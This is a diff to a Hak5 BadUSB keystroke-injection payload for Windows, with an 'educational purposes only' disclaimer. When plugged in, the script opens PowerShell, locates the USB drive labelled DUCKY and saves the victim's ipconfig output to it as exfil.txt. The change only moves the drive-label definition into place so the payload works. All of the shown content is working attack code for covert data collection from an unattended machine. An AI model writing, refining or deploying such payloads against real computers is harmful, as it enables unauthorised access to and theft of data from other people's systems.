@@ -3,7 +3,7 @@ REM Author: Mavisinator30001
 REM Description: Opens a powershell window and prints the current IP of the device to a text file in the BadUSB
 REM Target: Any Windows System
 REM DISCLAIMER!!! Neither I, nor Hak5, condone any unethical hacking practices using this payload... FOR EDUCATIONAL PURPOSES ONLY
-DEFINE #DRIVELABEL D
+DEFINE #DRIVELABEL DUCKY
 EXTENSION PASSIVE_WINDOWS_DETECT
     REM VERSION 1.1
     REM AUTHOR: Korben
@@ -55,7 +55,6 @@ GUI r
 DELAY 300
 STRINGLN Powershell
 DELAY 1000
-DEFINE #DRIVELABEL DUCKY
 STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='#DRIVELABEL'").DriveLetter; if ($driveLetter) { ipconfig | Out-File -Filepath "$driveLetter\exfil.txt" -Encoding utf8 }
 WAIT_FOR_STORAGE_ACTIVITY
 WAIT_FOR_STORAGE_INACTIVITY
